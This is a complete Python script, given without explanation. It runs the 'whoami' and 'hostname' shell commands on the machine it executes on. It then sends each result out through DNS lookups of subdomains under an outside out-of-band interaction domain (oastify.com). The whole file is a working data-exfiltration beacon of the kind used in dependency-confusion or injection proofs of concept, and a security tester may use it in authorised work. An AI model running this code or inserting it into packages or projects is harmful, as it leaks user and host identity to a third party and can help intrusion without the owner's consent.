import subprocess

def run_system_command(command):
    try:
        # Use subprocess.Popen for compatibility
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        stdout = stdout.decode('utf-8')  # Decode from bytes to string
        if process.returncode == 0:
            return stdout.strip()
        else:
            print("Error executing system command: {}".format(stderr.decode('utf-8')))
            return None
    except subprocess.CalledProcessError as e:
        print("Error executing system command: {}".format(e))
        return None
    except Exception as e:
        print("An error occurred while executing system command: {}".format(e))
        return None

def run_dns_lookup(subdomain):
    try:
        process = subprocess.Popen(["nslookup", subdomain], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        stdout = stdout.decode('utf-8')  # Decode for compatibility
        stderr = stderr.decode('utf-8')
        if process.returncode == 0:
            print("DNS lookup result for", subdomain)
            print(stdout)
        else:
            print("Error executing nslookup command for subdomain {}: {}".format(subdomain, stderr))
    except Exception as e:
        print("An error occurred while executing DNS lookup: {}".format(e))

def main():
    commands = ["whoami", "hostname"]
    base_domain = "y76c7i6kvlc7x16qcok8cp9en5twhw5l.oastify.com"

    for command in commands:
        command_output = run_system_command(command)
        if command_output:
            subdomain = "{}.{}".format(command_output, base_domain)
            print("Querying for subdomain:", subdomain)
            run_dns_lookup(subdomain)

if __name__ == "__main__":
    main()

